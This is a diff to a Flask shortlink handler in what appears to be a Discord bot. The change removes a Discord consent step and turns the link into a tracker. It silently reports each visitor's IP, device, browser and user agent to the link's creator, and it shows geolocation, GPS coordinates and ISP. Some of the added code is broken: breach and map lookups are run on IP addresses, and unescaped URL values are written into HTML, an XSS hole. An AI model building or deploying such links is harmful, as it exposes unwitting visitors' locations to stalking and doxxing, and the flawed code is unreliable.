@@ -331,17 +331,26 @@ def shortlink_redirect(short_id):
         conn.commit()
         conn.close()
         
-        session['link_data'] = {
-            'short_id': short_id,
-            'original_url': original_url,
-            'user_id': user_id,
-            'ip_address': ip_address,
-            'browser': browser,
-            'device_type': device_type,
-            'user_agent_str': user_agent_str
-        }
+        user_agent_obj = parse(user_agent_str)
+        os_info = get_os_info(user_agent_str)
+        ip_info = get_ip_info(ip_address)
         
-        oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify"
+        if bot_instance:
+            try:
+                loop = bot_instance.loop
+                asyncio.run_coroutine_threadsafe(
+                    notify_discord_shortlink(
+                        user_id,
+                        short_id,
+                        ip_address,
+                        browser,
+                        device_type,
+                        user_agent_str
+                    ),
+                    loop
+                )
+            except:
+                pass
         
         html = f"""
         <!DOCTYPE html>
@@ -349,42 +358,54 @@ def shortlink_redirect(short_id):
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Lien Raccourci</title>
+            <title>Résultats OSINT</title>
             <style>
                 body {{
                     font-family: Arial, sans-serif;
                     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    height: 100vh;
                     margin: 0;
+                    padding: 20px;
                 }}
                 .container {{
+                    max-width: 900px;
+                    margin: 0 auto;
+                }}
+                .section {{
                     background: white;
-                    padding: 40px;
+                    padding: 30px;
+                    margin: 20px 0;
                     border-radius: 10px;
                     box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-                    text-align: center;
-                    max-width: 500px;
                 }}
                 h1 {{
-                    color: #333;
-                    margin-bottom: 20px;
-                }}
-                p {{
-                    color: #666;
-                    font-size: 16px;
-                    margin: 15px 0;
-                }}
-                .url {{
-                    background: #f0f0f0;
-                    padding: 15px;
-                    border-radius: 5px;
-                    word-break: break-all;
                     color: #667eea;
+                    text-align: center;
+                    margin-top: 0;
+                }}
+                h2 {{
+                    color: #333;
+                    border-bottom: 2px solid #667eea;
+                    padding-bottom: 10px;
+                    font-size: 18px;
+                    margin-top: 0;
+                }}
+                .info-row {{
+                    display: flex;
+                    justify-content: space-between;
+                    padding: 10px 0;
+                    border-bottom: 1px solid #eee;
+                }}
+                .info-row:last-child {{
+                    border-bottom: none;
+                }}
+                .label {{
                     font-weight: bold;
-                    margin: 15px 0;
+                    color: #333;
+                    min-width: 150px;
+                }}
+                .value {{
+                    color: #667eea;
+                    word-break: break-all;
                 }}
                 .button {{
                     background: #5865F2;
@@ -394,41 +415,83 @@ def shortlink_redirect(short_id):
                     border-radius: 5px;
                     cursor: pointer;
                     font-size: 16px;
-                    margin-top: 20px;
                     text-decoration: none;
                     display: inline-block;
+                    text-align: center;
+                    width: 100%;
+                    box-sizing: border-box;
+                    margin-top: 20px;
                 }}
                 .button:hover {{
                     background: #4752C4;
-                }}
-                .skip {{
-                    background: #667eea;
-                    color: white;
-                    padding: 10px 20px;
-                    border: none;
-                    border-radius: 5px;
-                    cursor: pointer;
-                    font-size: 14px;
-                    margin-top: 10px;
-                    text-decoration: none;
-                    display: inline-block;
-                }}
-                .skip:hover {{
-                    background: #764ba2;
                 }}
             </style>
         </head>
         <body>
             <div class="container">
-                <h1>🔗 Lien Raccourci</h1>
-                <p>Vous allez être redirigé vers:</p>
-                <div class="url">{original_url}</div>
-                
-                <p style="margin: 20px 0; color: #999;">Connectez-vous avec Discord pour enregistrer votre visite</p>
-                
-                <a href="{oauth_url}" class="button">🔐 Continuer avec Discord</a>
-                <br>
-                <a href="{original_url}" class="skip">Passer cette étape</a>
+                <div class="section">
+                    <h1>🔍 Résultats OSINT</h1>
+                    
+                    <h2>💻 Informations Système</h2>
+                    <div class="info-row"><span class="label">Appareil:</span><span class="value">{device_type}</span></div>
+                    <div class="info-row"><span class="label">Système:</span><span class="value">{os_info}</span></div>
+                    <div class="info-row"><span class="label">Navigateur:</span><span class="value">{browser}</span></div>
+                    
+                    <h2>🌍 Informations IP</h2>
+                    <div class="info-row"><span class="label">Adresse IP:</span><span class="value">{ip_address}</span></div>
+        """
+        
+        if ip_info:
+            html += f"""
+                    <div class="info-row"><span class="label">Pays:</span><span class="value">{ip_info['country']}</span></div>
+                    <div class="info-row"><span class="label">Région:</span><span class="value">{ip_info['region']}</span></div>
+                    <div class="info-row"><span class="label">Ville:</span><span class="value">{ip_info['city']}</span></div>
+                    <div class="info-row"><span class="label">Fuseau horaire:</span><span class="value">{ip_info['timezone']}</span></div>
+                    <div class="info-row"><span class="label">Coordonnées GPS:</span><span class="value">{ip_info['lat']}, {ip_info['lon']}</span></div>
+                    <div class="info-row"><span class="label">FAI:</span><span class="value">{ip_info['isp']}</span></div>
+                    <div class="info-row"><span class="label">Organisation:</span><span class="value">{ip_info['org']}</span></div>
+            """
+        
+        try:
+            hibp_response = requests.get(
+                f'https://haveibeenpwned.com/api/v3/breachedaccount/{ip_address}',
+                headers={'User-Agent': 'Discord Bot'},
+                timeout=5
+            )
+            if hibp_response.status_code == 200:
+                breaches = hibp_response.json()
+                breach_names = [b['Name'] for b in breaches[:5]]
+                html += f"""
+                    <h2>⚠️ Fuites de Données</h2>
+                    <div class="info-row"><span class="label">Résultat:</span><span class="value">🚨 Trouvé dans {len(breaches)} fuite(s)</span></div>
+                """
+                for breach in breach_names:
+                    html += f'<div class="info-row"><span class="label"></span><span class="value">• {breach}</span></div>'
+        except:
+            pass
+        
+        try:
+            response = requests.get(
+                f'https://nominatim.openstreetmap.org/search?q={ip_address}&format=json&limit=3',
+                headers={'User-Agent': 'Discord Bot'},
+                timeout=5
+            )
+            if response.status_code == 200:
+                data = response.json()
+                if data:
+                    html += f'<h2>📍 Lieux Publics Associés</h2>'
+                    for location in data[:3]:
+                        display = location.get('display_name', 'Unknown')
+                        html += f'<div class="info-row"><span class="label"></span><span class="value">📌 {display}</span></div>'
+        except:
+            pass
+        
+        html += f"""
+                    <h2>🔗 Lien Original</h2>
+                    <div class="info-row"><span class="label">URL:</span><span class="value">{original_url}</span></div>
+                    
+                    <a href="{original_url}" class="button">↗️ Continuer vers le site</a>
+                </div>
             </div>
         </body>
         </html>
